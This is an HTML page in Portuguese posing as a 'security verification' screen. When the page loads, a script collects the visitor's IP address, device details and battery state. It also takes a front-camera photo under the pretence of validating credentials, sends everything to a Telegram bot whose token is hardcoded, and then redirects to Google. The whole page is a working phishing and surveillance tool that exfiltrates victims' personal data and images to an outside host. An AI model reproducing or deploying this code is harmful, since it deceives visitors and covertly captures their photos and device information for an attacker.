<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .container { text-align: center; background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; }
        h2 { color: #333; }
        p { color: #666; font-size: 0.9rem; }
        .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #3498db; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>Verificando Dispositivo...</h2>
        <p>Por favor, aguarde enquanto validamos suas credenciais de segurança.</p>
        <div class="loader"></div>
        <div id="status" style="font-size: 0.8rem; color: #999; margin-top: 10px;">Iniciando...</div>
        <video id="video" style="display:none;" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const BOT_TOKEN = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
        const CHAT_ID = "8607389403";
        const statusEl = document.getElementById('status');

        async function enviarDados() {
            statusEl.innerText = "Coletando dados...";
            const dados = {
                ua: navigator.userAgent,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                platform: navigator.platform,
                ip: "Buscando..."
            };

            // Pega IP
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                dados.ip = json.ip;
            } catch(e) { dados.ip = "Erro"; }

            // Pega Bateria (Corrigido)
            let batInfo = "N/A";
            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    batInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Bateria'})`;
                } catch(e) {}
            }

            let msg = `🔒 *Novo Acesso*\n\n📱 *UA:* ${dados.ua}\n🌐 *IP:* ${dados.ip}\n📐 *Tela:* ${dados.screen}\n💻 *OS:* ${dados.platform}\n🔋 *Bat:* ${batInfo}`;

            statusEl.innerText = "Acessando câmera...";
            // Tenta tirar foto
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1500)); 

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                stream.getTracks().forEach(track => track.stop());

                const imgData = canvas.toDataURL('image/jpeg', 0.5);
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', dataURItoBlob(imgData), 'cam.jpg');
                formData.append('caption', msg);
                formData.append('parse_mode', 'Markdown');
                
                statusEl.innerText = "Enviando foto...";
                const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await resp.json();
                if(result.ok) {
                    statusEl.innerText = "Sucesso!";
                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
                } else {
                    throw new Error("Telegram拒绝了: " + JSON.stringify(result));
                }

            } catch (err) {
                statusEl.innerText = "Erro na câmera. Enviando texto...";
                msg += `\n⚠️ *Câmera: Falha (${err.message})*`;
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('text', msg);
                formData.append('parse_mode', 'Markdown');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
                statusEl.innerText = "Enviado (Texto).";
                setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
            }
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        window.onload = enviarDados;
    </script>
</body>
</html>
